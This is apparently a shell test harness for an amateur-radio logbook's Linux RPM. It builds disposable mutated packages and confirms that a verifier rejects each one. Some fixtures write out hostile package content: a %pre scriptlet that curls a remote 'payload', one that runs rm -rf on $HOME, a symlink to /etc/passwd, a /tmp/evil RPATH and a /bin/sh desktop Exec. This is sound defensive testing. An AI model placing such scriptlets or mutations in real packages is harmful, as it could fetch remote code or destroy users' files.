#!/bin/sh
# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Mariusz Woźniak (SP6INA)
#
# Fail-closed negative fixture harness for the SPLogbook Linux x86_64 RPM (M3-I).
#
# Every fixture is a safe, disposable mutation of the real package. The job
# succeeds ONLY because each mutation is rejected by scripts/verify_linux_rpm.sh
# with a non-zero exit code and without any success message. The real package,
# the host package database and the user's home are never modified.
#
# Usage:
#   EXPECTED_BUILD_COMMIT=<40-hex> \
#     sh scripts/verify_linux_rpm_negative_fixture.sh <verifier> <package.rpm>

set -eu

VERIFIER="${1:-scripts/verify_linux_rpm.sh}"
RPM="${2:-}"
EXPECTED_COMMIT="${EXPECTED_BUILD_COMMIT:-}"
EXPECTED_ICON_SHA256="${EXPECTED_ICON_SHA256:-}"
EXPECTED_DESKTOP_SHA256="${EXPECTED_DESKTOP_SHA256:-}"

if [ -z "${RPM}" ] || [ ! -f "${RPM}" ]; then
    printf 'FAIL: usage: %s <verifier> <package.rpm>\n' "$0" >&2
    exit 1
fi
[ -f "${VERIFIER}" ] || {
    printf 'FAIL: verifier does not exist: %s\n' "${VERIFIER}" >&2
    exit 1
}
RPM="$(cd "$(dirname "${RPM}")" && pwd)/$(basename "${RPM}")"
VERIFIER="$(cd "$(dirname "${VERIFIER}")" && pwd)/$(basename "${VERIFIER}")"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
cd "${REPO_ROOT}"
for tool in rpm rpm2cpio cpio rpmbuild patchelf sha256sum grep awk mktemp \
    find sed head printf chmod chown ln cp stat; do
    command -v "${tool}" >/dev/null 2>&1 || {
        printf 'FAIL: required tool is missing: %s\n' "${tool}" >&2
        exit 1
    }
done

WORK="$(mktemp -d "${TMPDIR:-/tmp}/splogbook-rpm-negative.XXXXXX")"
cleanup() {
    rm -rf "${WORK}"
}
trap cleanup EXIT HUP INT TERM

TOTAL=0
REJECTED=0

fail() {
    printf 'FAIL: %s\n' "$*" >&2
    exit 1
}

BASE_ROOT="${WORK}/base-root"
mkdir -p "${BASE_ROOT}"
( cd "${BASE_ROOT}" && rpm2cpio "${RPM}" | cpio -idm --quiet --no-absolute-filenames ) \
    || fail "cannot extract the base RPM"

CASE=""
MANIFEST_MODE="full"

refresh_metadata() {
    sha256sum "${CASE}/pkg.rpm" > "${CASE}/pkg.rpm.sha256"
    case "${MANIFEST_MODE}" in
        full)
            sh scripts/linux_rpm_manifest.sh "${CASE}/pkg.rpm" "${CASE}/pkg.rpm.manifest" \
                splogbook 1.3.0 0.1.alpha.1 x86_64 "${EXPECTED_COMMIT}" \
                > "${CASE}/manifest.log" 2>&1 \
                || {
                    cat "${CASE}/manifest.log" >&2
                    fail "cannot regenerate the fixture manifest"
                }
            ;;
        artifact-only)
            actual_sha="$(sha256sum "${CASE}/pkg.rpm" | awk '{print $1}')"
            actual_size="$(wc -c < "${CASE}/pkg.rpm" | tr -d ' ')"
            sed -i \
                -e "s/^artifact_sha256=.*/artifact_sha256=${actual_sha}/" \
                -e "s/^artifact_size=.*/artifact_size=${actual_size}/" \
                "${CASE}/pkg.rpm.manifest"
            ;;
        keep)
            ;;
        *)
            fail "unknown manifest mode: ${MANIFEST_MODE}"
            ;;
    esac
}

prepare_root() {
    cp -a "${BASE_ROOT}" "${CASE}/root"
}

rebuild() {
    name="$1"
    version="$2"
    release="$3"
    arch="$4"
    extra="${5:-}"
    if [ -n "${extra}" ]; then
        sh scripts/build_linux_rpm_fixture.sh "${CASE}/root" "${CASE}/pkg.rpm" \
            "${name}" "${version}" "${release}" "${arch}" "${extra}" \
            > "${CASE}/fixture.log" 2>&1
    else
        sh scripts/build_linux_rpm_fixture.sh "${CASE}/root" "${CASE}/pkg.rpm" \
            "${name}" "${version}" "${release}" "${arch}" \
            > "${CASE}/fixture.log" 2>&1
    fi || {
        cat "${CASE}/fixture.log" >&2
        fail "fixture rebuild failed"
    }
    refresh_metadata
}

expect_reject() {
    name="$1"
    mutation="$2"
    TOTAL=$((TOTAL + 1))
    CASE="${WORK}/case-${TOTAL}"
    mkdir -p "${CASE}"
    cp "${RPM}" "${CASE}/pkg.rpm"
    cp "${RPM}.sha256" "${CASE}/pkg.rpm.sha256"
    cp "${RPM}.manifest" "${CASE}/pkg.rpm.manifest"
    MANIFEST_MODE="full"
    "${mutation}"
    set +e
    SPLOG_RPM_INSPECTION_ONLY=1 \
    SPLOG_RPM_SKIP_RPMLINT=1 \
    EXPECTED_BUILD_COMMIT="${EXPECTED_COMMIT}" \
    EXPECTED_ICON_SHA256="${EXPECTED_ICON_SHA256}" \
    EXPECTED_DESKTOP_SHA256="${EXPECTED_DESKTOP_SHA256}" \
        sh "${VERIFIER}" "${CASE}/pkg.rpm" > "${CASE}/log" 2>&1
    CODE=$?
    set -e
    if [ "${CODE}" -eq 0 ]; then
        printf '\n--- fixture log (%s) ---\n' "${name}"
        cat "${CASE}/log"
        fail "fixture was NOT rejected (exit 0): ${name}"
    fi
    if grep -q "COMPLETED SUCCESSFULLY" "${CASE}/log"; then
        printf '\n--- fixture log (%s) ---\n' "${name}"
        cat "${CASE}/log"
        fail "fixture emitted a success message: ${name}"
    fi
    REJECTED=$((REJECTED + 1))
    printf 'REJECTED %-34s exit=%s\n' "${name}" "${CODE}"
}

# --- package-integrity mutations -------------------------------------
mutate_missing_sha() {
    rm -f "${CASE}/pkg.rpm.sha256"
    MANIFEST_MODE="keep"
}

mutate_wrong_sha() {
    printf '0000000000000000000000000000000000000000000000000000000000000000  pkg.rpm\n' \
        > "${CASE}/pkg.rpm.sha256"
    MANIFEST_MODE="keep"
}

mutate_truncated() {
    head -c 4096 "${CASE}/pkg.rpm" > "${CASE}/pkg.rpm.tmp"
    mv "${CASE}/pkg.rpm.tmp" "${CASE}/pkg.rpm"
    MANIFEST_MODE="artifact-only"
    refresh_metadata
}

mutate_missing_manifest() {
    rm -f "${CASE}/pkg.rpm.manifest"
    MANIFEST_MODE="keep"
}

mutate_bad_manifest() {
    sed -i 's/^artifact_sha256=.*/artifact_sha256=0000000000000000000000000000000000000000000000000000000000000000/' \
        "${CASE}/pkg.rpm.manifest"
    MANIFEST_MODE="keep"
}

# --- metadata mutations ----------------------------------------------
mutate_bad_name() {
    prepare_root
    rebuild splogbook-wrong 1.3.0 0.1.alpha.1 x86_64
}

mutate_bad_version() {
    prepare_root
    rebuild splogbook 1.3.1 0.1.alpha.1 x86_64
}

mutate_bad_release() {
    prepare_root
    rebuild splogbook 1.3.0 1 x86_64
}

mutate_bad_arch() {
    prepare_root
    # rpmbuild rejects ELF payloads in a noarch package.  The architecture is
    # checked before any payload probe, so remove the ELF files to create a
    # valid noarch header with the wrong architecture.
    rm -f "${CASE}/root/opt/SPLogbook/SPLogbook" \
        "${CASE}/root/opt/SPLogbook/splogbook-updater" \
        "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4"
    rebuild splogbook 1.3.0 0.1.alpha.1 noarch
}

mutate_bad_commit() {
    prepare_root
    sed -i 's/"build_commit": "[0-9a-f]*"/"build_commit": "1111111111111111111111111111111111111111"/' \
        "${CASE}/root/opt/SPLogbook/.splogbook-rpm-marker"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_bad_target() {
    prepare_root
    sed -i 's/"target": "linux-x86_64"/"target": "linux-aarch64"/' \
        "${CASE}/root/opt/SPLogbook/.splogbook-rpm-marker"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

# --- payload mutations -----------------------------------------------
mutate_missing_binary() {
    prepare_root
    rm -f "${CASE}/root/opt/SPLogbook/SPLogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_missing_updater() {
    prepare_root
    rm -f "${CASE}/root/opt/SPLogbook/splogbook-updater"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_missing_launcher() {
    prepare_root
    rm -f "${CASE}/root/usr/bin/splogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_extra_file() {
    prepare_root
    printf 'ROGUE\n' > "${CASE}/root/opt/SPLogbook/rogue.txt"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_extra_lib() {
    prepare_root
    cp "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4" \
        "${CASE}/root/opt/SPLogbook/lib/rogue.so.1"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_launcher_mode() {
    prepare_root
    chmod 0644 "${CASE}/root/usr/bin/splogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_owner() {
    prepare_root
    chown 65534:65534 "${CASE}/root/usr/bin/splogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_symlink() {
    prepare_root
    rm -f "${CASE}/root/opt/SPLogbook/LICENSE"
    ln -s /etc/passwd "${CASE}/root/opt/SPLogbook/LICENSE"
    MANIFEST_MODE="artifact-only"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_missing_hamlib() {
    prepare_root
    rm -f "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_wrong_soname() {
    prepare_root
    mv "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4" \
        "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.5"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_hamlib_not_elf() {
    prepare_root
    printf 'NOT AN ELF SHARED OBJECT\n' \
        > "${CASE}/root/opt/SPLogbook/lib/libhamlib.so.4"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_runpath() {
    prepare_root
    patchelf --set-rpath /tmp/evil "${CASE}/root/opt/SPLogbook/SPLogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_rpath() {
    prepare_root
    patchelf --force-rpath --set-rpath /tmp/evil "${CASE}/root/opt/SPLogbook/SPLogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_unresolved_library() {
    prepare_root
    patchelf --replace-needed libasound.so.2 libsplog-missing.so.0 \
        "${CASE}/root/opt/SPLogbook/SPLogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

# --- launcher and desktop mutations ----------------------------------
mutate_launcher_sudo() {
    prepare_root
    printf 'sudo /bin/true\n' >> "${CASE}/root/usr/bin/splogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_launcher_ldpath() {
    prepare_root
    printf 'LD_LIBRARY_PATH=/tmp\n' >> "${CASE}/root/usr/bin/splogbook"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_bad_exec() {
    prepare_root
    sed -i 's|^Exec=.*|Exec=/bin/sh|' \
        "${CASE}/root/usr/share/applications/splogbook.desktop"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_missing_icon() {
    prepare_root
    rm -f "${CASE}/root/usr/share/icons/hicolor/256x256/apps/splogbook.png"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_missing_marker() {
    prepare_root
    rm -f "${CASE}/root/opt/SPLogbook/.splogbook-rpm-marker"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

mutate_bad_glibc() {
    prepare_root
    sed -i 's/"maximum_glibc": "2.43"/"maximum_glibc": "2.44"/' \
        "${CASE}/root/opt/SPLogbook/.splogbook-rpm-marker"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64
}

# --- scriptlet mutations ---------------------------------------------
mutate_pre_scriptlet() {
    prepare_root
    printf '%%pre\nprintf "pre\\\\n"\n' > "${CASE}/extra.spec"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64 "${CASE}/extra.spec"
}

mutate_network_scriptlet() {
    prepare_root
    printf '%%pre\ncurl http://example.com/payload\n' > "${CASE}/extra.spec"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64 "${CASE}/extra.spec"
}

mutate_user_data_scriptlet() {
    prepare_root
    printf '%%pre\nrm -rf "$HOME"\n' > "${CASE}/extra.spec"
    rebuild splogbook 1.3.0 0.1.alpha.1 x86_64 "${CASE}/extra.spec"
}

echo "=================================================================="
echo "SPLogbook RPM negative fixtures (M3-I)"
echo "Package: ${RPM}"
echo "Verifier: ${VERIFIER}"
echo "=================================================================="

expect_reject "missing .sha256" mutate_missing_sha
expect_reject "wrong SHA-256" mutate_wrong_sha
expect_reject "truncated/non-RPM" mutate_truncated
expect_reject "missing manifest" mutate_missing_manifest
expect_reject "manifest mismatch" mutate_bad_manifest
expect_reject "wrong package name" mutate_bad_name
expect_reject "wrong version" mutate_bad_version
expect_reject "wrong release" mutate_bad_release
expect_reject "wrong architecture" mutate_bad_arch
expect_reject "wrong build_commit" mutate_bad_commit
expect_reject "wrong target" mutate_bad_target
expect_reject "missing main binary" mutate_missing_binary
expect_reject "missing updater" mutate_missing_updater
expect_reject "missing launcher" mutate_missing_launcher
expect_reject "extra forbidden file" mutate_extra_file
expect_reject "extra library in lib/" mutate_extra_lib
expect_reject "launcher mode 0644" mutate_launcher_mode
expect_reject "wrong owner/group" mutate_owner
expect_reject "symlink instead of file" mutate_symlink
expect_reject "missing private Hamlib" mutate_missing_hamlib
expect_reject "wrong Hamlib SONAME" mutate_wrong_soname
expect_reject "Hamlib is not an ELF" mutate_hamlib_not_elf
expect_reject "forbidden RUNPATH" mutate_runpath
expect_reject "forbidden RPATH" mutate_rpath
expect_reject "unresolved library" mutate_unresolved_library
expect_reject "launcher uses sudo" mutate_launcher_sudo
expect_reject "launcher LD_LIBRARY_PATH" mutate_launcher_ldpath
expect_reject "dangerous desktop Exec" mutate_bad_exec
expect_reject "missing icon" mutate_missing_icon
expect_reject "missing marker" mutate_missing_marker
expect_reject "GLIBC above 2.43" mutate_bad_glibc
expect_reject "forbidden %pre scriptlet" mutate_pre_scriptlet
expect_reject "scriptlet uses network" mutate_network_scriptlet
expect_reject "scriptlet removes user data" mutate_user_data_scriptlet

if [ "${REJECTED}" -ne "${TOTAL}" ]; then
    fail "only ${REJECTED}/${TOTAL} fixtures were rejected"
fi

echo "=================================================================="
echo "NEGATIVE FIXTURES REJECTED AS EXPECTED: ${REJECTED}/${TOTAL}"
echo "=================================================================="
